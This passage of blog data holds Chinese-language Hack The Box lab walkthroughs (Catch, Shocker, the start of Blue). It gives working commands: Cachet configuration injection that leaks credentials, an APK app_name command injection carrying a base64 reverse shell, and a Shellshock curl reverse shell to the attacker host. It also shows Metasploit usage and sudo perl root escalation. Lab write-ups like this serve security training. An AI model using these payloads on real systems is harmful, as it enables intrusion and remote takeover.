updates&quot;,&quot;lastActive&quot;:&quot;2021-12-14T10:18:04.710Z&quot;,&quot;created&quot;:&quot;2021-12-14T10:00:31.043Z&quot;,&quot;owner&quot;:&quot;61b86aead984e2451036eb16&quot;,&quot;private&quot;:false,&quot;hasPassword&quot;:false,&quot;participants&quot;:[]}] 读取一下 rooms 的内容 ┌──(root💀kali)-[~/Desktop] └─# curl -H &#39;Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==&#39; &#39;http://10.10.11.150:5000/rooms/61b86b28d984e2451036eb17/messages&#39; [{&quot;id&quot;:&quot;61b8732cfe190b466d476c02&quot;,&quot;text&quot;:&quot;ah sure!&quot;,&quot;posted&quot;:&quot;2021-12-14T10:34:20.749Z&quot;,&quot;owner&quot;:&quot;61b86dbdfe190b466d476bf0&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b8731ffe190b466d476c01&quot;,&quot;text&quot;:&quot;You should actually include this task to your list as well as a part of quarterly audit&quot;,&quot;posted&quot;:&quot;2021-12-14T10:34:07.449Z&quot;,&quot;owner&quot;:&quot;61b86aead984e2451036eb16&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b872b9fe190b466d476c00&quot;,&quot;text&quot;:&quot;Also make sure we&#39;ve our systems, applications and databases up-to-date.&quot;,&quot;posted&quot;:&quot;2021-12-14T10:32:25.514Z&quot;,&quot;owner&quot;:&quot;61b86dbdfe190b466d476bf0&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b87282fe190b466d476bff&quot;,&quot;text&quot;:&quot;Excellent! &quot;,&quot;posted&quot;:&quot;2021-12-14T10:31:30.403Z&quot;,&quot;owner&quot;:&quot;61b86aead984e2451036eb16&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b87277fe190b466d476bfe&quot;,&quot;text&quot;:&quot;Why not. We&#39;ve this in our todo list for next quarter&quot;,&quot;posted&quot;:&quot;2021-12-14T10:31:19.094Z&quot;,&quot;owner&quot;:&quot;61b86dbdfe190b466d476bf0&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b87241fe190b466d476bfd&quot;,&quot;text&quot;:&quot;@john is it possible to add SSL to our status domain to make sure everything is secure ? &quot;,&quot;posted&quot;:&quot;2021-12-14T10:30:25.108Z&quot;,&quot;owner&quot;:&quot;61b86aead984e2451036eb16&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b8702dfe190b466d476bfa&quot;,&quot;text&quot;:&quot;Here are the credentials `john : E}V!mywu_69T4C}W`&quot;,&quot;posted&quot;:&quot;2021-12-14T10:21:33.859Z&quot;,&quot;owner&quot;:&quot;61b86f15fe190b466d476bf5&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b87010fe190b466d476bf9&quot;,&quot;text&quot;:&quot;Sure one sec.&quot;,&quot;posted&quot;:&quot;2021-12-14T10:21:04.635Z&quot;,&quot;owner&quot;:&quot;61b86f15fe190b466d476bf5&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b86fb1fe190b466d476bf8&quot;,&quot;text&quot;:&quot;Can you create an account for me ? &quot;,&quot;posted&quot;:&quot;2021-12-14T10:19:29.677Z&quot;,&quot;owner&quot;:&quot;61b86dbdfe190b466d476bf0&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;},{&quot;id&quot;:&quot;61b86f4dfe190b466d476bf6&quot;,&quot;text&quot;:&quot;Hey Team! I&#39;ll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me. &quot;,&quot;posted&quot;:&quot;2021-12-14T10:17:49.761Z&quot;,&quot;owner&quot;:&quot;61b86f15fe190b466d476bf5&quot;,&quot;room&quot;:&quot;61b86b28d984e2451036eb17&quot;}] 继续读取一下房间内的消息 username = john password = E}V!mywu_69T4C}W 这里从上面的内容中提取到了一组账号密码 拿到 8000 端口去登陆试试 成功登陆，到处看看 我们可以看到，这是一个 cachet 的服务器，去搜索一下漏洞 找到了一篇 Cachet 2.4：通过 Laravel 配置注入执行代码 CVE-2021-39165 https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection 根据文章描述，拦截 EMAIL 的包，将内容修改为注入语句就行了 修改为 ${DB_USERNAME} 修改为 ${DB_PASSWORD} username = will passowrd = s2#4Fg0_%3! 得到了一组账号密码，去登陆 ssh ┌──(root💀kali)-[~/Desktop] └─# ssh will@10.10.11.150 will@10.10.11.150&#39;s password: Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-104-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed 06 Apr 2022 08:41:02 AM UTC System load: 0.19 Usage of /: 75.6% of 16.61GB Memory usage: 83% Swap usage: 33% Processes: 448 Users logged in: 0 IPv4 address for br-535b7cf3a728: 172.18.0.1 IPv4 address for br-fe1b5695b604: 172.19.0.1 IPv4 address for docker0: 172.17.0.1 IPv4 address for eth0: 10.10.11.150 IPv6 address for eth0: dead:beef::250:56ff:feb9:ffd 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Wed Apr 6 08:40:51 2022 from 10.10.14.9 will@catch:~$ whoami&amp;&amp;id will uid=1000(will) gid=1000(will) groups=1000(will) 登陆成功 will@catch:~$ ls user.txt will@catch:~$ cat user.txt 24b48fcc5b166f68a855af04633081c7 成功拿到 user 权限的 flag 文件 权限提升will@catch:~$ sudo -l [sudo] password for will: Sorry, user will may not run sudo on catch. 查看 sudo -l 失败，那看来不是这个提权思路了 去跑了一下 linpeas.sh [+] Readable files belonging to root and readable by me but not world readable -rwxr-x--x+ 1 root root 1894 Mar 3 14:23 /opt/mdm/verify.sh -rw-r----- 1 root will 33 Apr 5 17:23 /home/will/user.txt 这里看到有一个 &#x2F;opt&#x2F;mdm&#x2F;verify.sh 文件，去进程搜一下 will@catch:~$ ps auxw|grep verify.sh will 386873 0.0 0.0 6436 656 pts/0 S+ 08:59 0:00 grep --color=auto verify.sh 也有运行记录，去查看一下文件 will@catch:~$ cat /opt/mdm/verify.sh #!/bin/bash ################### # Signature Check # ################### sig_check() { jarsigner -verify &quot;$1/$2&quot; 2&gt;/dev/null &gt;/dev/null if [[ $? -eq 0 ]]; then echo &#39;[+] Signature Check Passed&#39; else echo &#39;[!] Signature Check Failed. Invalid Certificate.&#39; cleanup exit fi } ####################### # Compatibility Check # ####################### comp_check() { apktool d -s &quot;$1/$2&quot; -o $3 2&gt;/dev/null &gt;/dev/null COMPILE_SDK_VER=$(grep -oPm1 &quot;(?&lt;=compileSdkVersion=\\&quot;)[^\\&quot;]+&quot; &quot;$PROCESS_BIN/AndroidManifest.xml&quot;) if [ -z &quot;$COMPILE_SDK_VER&quot; ]; then echo &#39;[!] Failed to find target SDK version.&#39; cleanup exit else if [ $COMPILE_SDK_VER -lt 18 ]; then echo &quot;[!] APK Doesn&#39;t meet the requirements&quot; cleanup exit fi fi } #################### # Basic App Checks # #################### app_check() { APP_NAME=$(grep -oPm1 &quot;(?&lt;=&lt;string name=\\&quot;app_name\\&quot;&gt;)[^&lt;]+&quot; &quot;$1/res/values/strings.xml&quot;) echo $APP_NAME if [[ $APP_NAME == *&quot;Catch&quot;* ]]; then echo -n $APP_NAME|xargs -I {} sh -c &#39;mkdir {}&#39; mv &quot;$3/$APK_NAME&quot; &quot;$2/$APP_NAME/$4&quot; else echo &quot;[!] App doesn&#39;t belong to Catch Global&quot; cleanup exit fi } ########### # Cleanup # ########### cleanup() { rm -rf $PROCESS_BIN;rm -rf &quot;$DROPBOX/*&quot; &quot;$IN_FOLDER/*&quot;;rm -rf $(ls -A /opt/mdm | grep -v apk_bin | grep -v verify.sh) } ################### # MDM CheckerV1.0 # ################### DROPBOX=/opt/mdm/apk_bin IN_FOLDER=/root/mdm/apk_bin OUT_FOLDER=/root/mdm/certified_apps PROCESS_BIN=/root/mdm/process_bin for IN_APK_NAME in $DROPBOX/*.apk;do OUT_APK_NAME=&quot;$(echo ${IN_APK_NAME##*/} | cut -d &#39;.&#39; -f1)_verified.apk&quot; APK_NAME=&quot;$(openssl rand -hex 12).apk&quot; if [[ -L &quot;$IN_APK_NAME&quot; ]]; then exit else mv &quot;$IN_APK_NAME&quot; &quot;$IN_FOLDER/$APK_NAME&quot; fi sig_check $IN_FOLDER $APK_NAME comp_check $IN_FOLDER $APK_NAME $PROCESS_BIN app_check $PROCESS_BIN $OUT_FOLDER $IN_FOLDER $OUT_APK_NAME done cleanup 这里的 app_check() 函数有问题 它在 &#x2F;res&#x2F;values&#x2F;strings.xml 的 APK 中搜索 APP_NAME 我们可以利用一下 做一个命令注入 ┌──(root💀kali)-[~/Desktop] └─# echo &#39;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.9/4444 0&gt;&amp;1&#39;|base64 L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQ0NCAwPiYxCg== ┌──(root💀kali)-[~/Desktop] └─# echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQ0NCAwPiYxCg==|base64 -d /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.9/4444 0&gt;&amp;1 然后编写一下 payload &lt;string name=&quot;app_name&quot;&gt;Catch|echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQ0NCAwPiYxCg== | base64 -d | bash&lt;/string&gt; 然后使用上面的 payload 替换 &#x2F;res&#x2F;values&#x2F;strings.xml 的第 30 行 app_name 这一行 接着使用 nc -nvlp 监听一个端口 nc -nvlp 4444 然后去使用 github 上最新版本 2.6.1 的 apktool 来打包构造新的 app ┌──(root💀kali)-[~/Desktop/catch] └─# java -jar apktool_2.6.1.jar b -f -d catchv1.0 -o catchv2.0.apk 1 ⨯ Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true I: Using Apktool 2.6.1 I: Smaling smali folder into classes.dex... I: Building resources... I: Building apk file... I: Copying unknown files/dir... I: Built apk... ┌──(root💀kali)-[~/Desktop/catch] └─# ls apktool_2.6.1.jar catchv1.0 catchv1.0.apk catchv2.0.apk 然后去给 apk 签名，并且验证 keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000 jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore catchv2.0.apk alias_name jarsigner -verify -verbose -certs catchv2.0.apk ┌──(root💀kali)-[~/Desktop/catch] └─# keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true 输入密钥库口令: 再次输入新口令: 您的名字与姓氏是什么? [Unknown]: 您的组织单位名称是什么? [Unknown]: 您的组织名称是什么? [Unknown]: 您所在的城市或区域名称是什么? [Unknown]: 您所在的省/市/自治区名称是什么? [Unknown]: 该单位的双字母国家/地区代码是什么? [Unknown]: CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown是否正确? [否]: y 正在为以下对象生成 2,048 位RSA密钥对和自签名证书 (SHA256withRSA) (有效期为 10,000 天): CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown [正在存储my-release-key.keystore] ┌──(root💀kali)-[~/Desktop/catch] └─# ls my-release-key.keystore my-release-key.keystore 生成了一个签名文件，然后验证内容较多，就不放出来了，大家自行验证即可 使用 python3 -m 开启一个 HTTP 服务器 ┌──(root💀kali)-[~/Desktop/catch] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 然后使用 wget 下载这个 apk will@catch:~$ wget http://10.10.14.9/catchv2.0.apk --2022-04-06 09:28:38-- http://10.10.14.9/catchv2.0.apk Connecting to 10.10.14.9:80... connected. HTTP request sent, awaiting response... 200 OK Length: 2821343 (2.7M) [application/vnd.android.package-archive] Saving to: ‘catchv2.0.apk’ catchv2.0.apk 100%[=================================================================&gt;] 2.69M 869KB/s in 3.2s 2022-04-06 09:28:42 (869 KB/s) - ‘catchv2.0.apk’ saved [2821343/2821343] 然后将下载的 apk 放入 /opt/mdm/apk_bin 文件夹 will@catch:~$ cp catchv2.0.apk /opt/mdm/apk_bin will@catch:~$ ls /opt/mdm/apk_bin catchv2.0.apk ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.9] from (UNKNOWN) [10.10.11.150] 34410 bash: cannot set terminal process group (397832): Inappropriate ioctl for device bash: no job control in this shell root@catch:~# whoami&amp;&amp;id whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) 然后等待一会儿，我们就会获得一个 root 权限的 shell root@catch:~# cd /root cd /root root@catch:~# cat root.txt cat root.txt 36160af074e848d9139b7d14c9c4e5ca 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Shocker - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Shocker","date":"2022-04-04T11:38:36.000Z","updated":"2023-06-17T02:25:53.000Z","comments":true,"path":"2022/04/04/Hackthebox/Easy/Hackthebox-Shocker/","link":"","permalink":"http://www.lucifiel.com/2022/04/04/Hackthebox/Easy/Hackthebox-Shocker/","excerpt":"","text":"Hackthebox - Shocker靶场信息 靶场类型 信息收集Nmap┌──(root💀kali)-[~/Desktop/HTB/Easy/Shocker] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.56 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-01 22:29 EDT Nmap scan report for 10.10.10.56 Host is up (0.25s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn&#39;t have a title (text/html). 2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA) | 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA) |_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=4/1%OT=80%CT=1%CU=41565%PV=Y%DS=2%DC=T%G=Y%TM=6247B561 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)SEQ( OS:SP=102%GCD=1%ISR=10B%TI=Z%II=I%TS=B)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=I%T OS:S=8)OPS(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5= OS:M505ST11NW6%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7 OS:120)ECN(R=Y%DF=Y%T=40%W=7210%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A OS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0% OS:Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S= OS:A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R= OS:Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N% OS:T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 61716/tcp) HOP RTT ADDRESS 1 246.66 ms 10.10.14.1 2 246.79 ms 10.10.10.56 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 67.63 seconds Http 这里也没看到什么东西，去 fuzz 一下 Fuzz┌──(root💀kali)-[~/Desktop] └─# ffuf -u &quot;http://10.10.10.56/FUZZ&quot; -w /usr/share/dirb/wordlists/common.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.10.56/FUZZ :: Wordlist : FUZZ: /usr/share/dirb/wordlists/common.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ [Status: 200, Size: 137, Words: 9, Lines: 10] .hta [Status: 403, Size: 290, Words: 22, Lines: 12] .htaccess [Status: 403, Size: 295, Words: 22, Lines: 12] .htpasswd [Status: 403, Size: 295, Words: 22, Lines: 12] cgi-bin/ [Status: 403, Size: 294, Words: 22, Lines: 12] index.html [Status: 200, Size: 137, Words: 9, Lines: 10] server-status [Status: 403, Size: 299, Words: 22, Lines: 12] :: Progress: [4614/4614] :: Job [1/1] :: 80 req/sec :: Duration: [0:01:00] :: Errors: 0 :: 看到有一个 cgi-bin 目录，继续 fuzz ┌──(root💀kali)-[~/Desktop] └─# ffuf -u &quot;http://10.10.10.56/cgi-bin/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -e .sh,.pl /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.10.56/cgi-bin/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt :: Extensions : .sh .pl :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ user.sh [Status: 200, Size: 118, Words: 19, Lines: 8] [Status: 403, Size: 294, Words: 22, Lines: 12] :: Progress: [60348/60348] :: Job [1/1] :: 152 req/sec :: Duration: [0:15:14] :: Errors: 19 :: 发现一个 user.sh 文件，去查看一下 有点不太明白这是啥，去 google 一下吧 https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock 找到一篇文章 漏洞利用Shellshock根据文章内容，尝试一下反弹 shell 使用 nc 监听一个端口 nc -nvlp 4444 然后去利用 curl -i -H &quot;User-agent: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.4/4444 0&gt;&amp;1&quot; http://10.10.10.56/cgi-bin/user.sh ┌──(root💀kali)-[~/Desktop] └─# nc -nvlp 4444 1 ⨯ listening on [any] 4444 ... connect to [10.10.14.4] from (UNKNOWN) [10.10.10.56] 40320 bash: no job control in this shell shelly@Shocker:/usr/lib/cgi-bin$ whoami&amp;&amp;id whoami&amp;&amp;id shelly uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare) shelly@Shocker:/usr/lib/cgi-bin$ 成功得到一个 user 权限的 shell exploit-db https://www.exploit-db.com/exploits/34900 我这边利用有点问题，就不测试了 Metasploituse exploit/multi/http/apache_mod_cgi_bash_env_exec msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; show options Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec): Name Current Setting Required Description ---- --------------- -------- ----------- CMD_MAX_LENGTH 2048 yes CMD max line length CVE CVE-2014-6271 yes CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278) HEADER User-Agent yes HTTP header to use METHOD GET yes HTTP method to use Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.56 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPATH /bin yes Target PATH for binaries used by the CmdStager RPORT 80 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) TARGETURI /cgi-bin/user.sh yes Path to CGI script TIMEOUT 5 yes HTTP read response timeout (seconds) URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host Payload options (linux/x86/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.4 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Linux x86 设置好相关的配置后，执行 msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; exploit [*] Started reverse TCP handler on 10.10.14.4:4444 [*] Command Stager progress - 100.46% done (1097/1092 bytes) [*] Sending stage (984904 bytes) to 10.10.10.56 [*] Meterpreter session 2 opened (10.10.14.4:4444 -&gt; 10.10.10.56:40322) at 2022-04-02 00:56:02 -0400 meterpreter &gt; getuid Server username: shelly @ Shocker (uid=1000, gid=1000, euid=1000, egid=1000) 这里也成功回弹 修复 shellpython3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; Ctrl+Z返回 stty raw -echo; fg export TERM=xterm stty rows 51 cols 237 shelly@Shocker:/home/shelly$ cat user.txt 2ec24e11320026d1e70ff3e16695b233 成功拿到 user 权限的 flag 文件 权限提升shelly@Shocker:/home/shelly$ sudo -l Matching Defaults entries for shelly on Shocker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User shelly may run the following commands on Shocker: (root) NOPASSWD: /usr/bin/perl 使用 sudo -l 查看得知有权限使用 sudo 运行 &#x2F;usr&#x2F;bin&#x2F;perl https://gtfobins.github.io/gtfobins/perl/ perl 可以用上面的方法提权，尝试一下 sudo /usr/bin/perl -e &#39;exec &quot;/bin/sh&quot;;&#39; shelly@Shocker:/usr/lib/cgi-bin$ sudo /usr/bin/perl -e &#39;exec &quot;/bin/sh&quot;;&#39; # whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) 成功提权到 root 权限 # cat root.txt 52c2715605d70c7619030560dc1ca467 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Blue - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Blue","date":"2022-04-03T11:38:36.000Z","updated":"2023-06-13T03:41:01.000Z","comments":true,"path":"2022/04/03/Hackthebox/Easy/Hackthebox-Blue/","link":"","permalink":"http://www.lucifiel.com/2022/04/03/Hackthebox/Easy/Hackthebox-Blue/","excerpt":"","text":"Hackthebox - Blue靶场信息 靶场类型 信息搜集Nmap┌──(root💀kali)-[~/Desktop/HTB/Easy/Blue] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.40 Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-30 00:22 EDT Nmap scan report for 10.10.10.40 Host is up (0.57s latency). Not shown: 60896 filtered ports, 4636 closed ports PORT STATE SERVICE VERSION 135/tcp open tcpwrapped 139/tcp open tcpwrapped 445/tcp open tcpwrapped Windows 7 Professional 7601 Service Pack 1 tcpwrapped No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=3/30%OT=445%CT=21%CU=36006%PV=Y%DS=2%DC=T%G=Y%TM=6243D OS:C0A%P=x86_64-pc-linux-gnu)SEQ(CI=I)SEQ(SP=106%GCD=1%ISR=108%TI=I%CI=I%II OS:=I%SS=S%TS=7)OPS(O1=M54BNW8ST11%O2=M54BNW8ST11%O3=M54BNW8NNT11%O4=M54BNW OS:8ST11%O5=M54BNW8ST11%O6=M54BST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5= OS:2000%W6=2000)ECN(R=N)ECN(R=Y%DF=Y%T=80%W=2000%O=M54BNW8NNS%CC=N%Q=)T1(R= OS:N)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T2(R=Y%DF=Y%T=80%W=0%S=Z OS:%A=S%F=AR%O=%RD=0%Q=)T3(R=N)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q= OS:)T4(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T OS:=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R OS:%O=%RD=0%Q=)T7(R=N)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=N) OS:U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)I OS:E(R=Y%DFI=N%T=80%CD=Z) Network Distance: 2 hops Host script results: |_clock-skew: mean: -19m57s, deviation: 34m37s, median: 1s | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: haris-PC | NetBIOS computer name: HARIS-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2022-03-30T05:26:31+01:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2022-03-30T04:26:34 |_ start_date: 2022-03-30T04:03:04 TRACEROUTE (using port 995/tcp) HOP RTT ADDRESS 1 552.18 ms 10.10.16.1 2 255.14 ms 10.10.10.40 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 238.83 seconds 这台很明显了，而且相信大家看名字就已经很明确了，我就不多说了，直接利用吧 永恒之蓝Nmap┌──(root💀kali)-[~/Desktop] └─# nmap --script=vuln 10.10.10.40 Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-30 00:29 EDT Nmap scan report for 10.10.10.40 Host is up (0.54s latency). Not shown: 991 closed ports PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49156/tcp open unknown 49157/tcp open unknown Host script results: |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 |_ https://technet.microsoft.com/en-us/library/security/ms17-010.aspx Nmap done: 1 IP address (1 host up) scanned in 173.70 seconds 确认存在 Metasploituse auxiliary/scanner/smb/smb_ms17_010 msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; show options Module options (auxiliary/scanner/smb/smb_ms17_010): Name Current Setting Required Description ---- --------------- -------- ----------- CHECK_ARCH true no Check for architecture on vulnerable hosts CHECK_DOPU true no Check for DOUBLEPULSAR on vulnerable hosts CHECK_PIPE false no Check for named pipe on vulnerable hosts NAMED_PIPES /usr/share/metasploit-framework/data/wordlists/named_pipes.txt yes List of named pipes to check RHOSTS 10.10.10.40 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 445 yes The SMB service port (TCP) SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate as THREADS 1 yes The number of concurrent threads (max one per host) msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; exploit [+] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 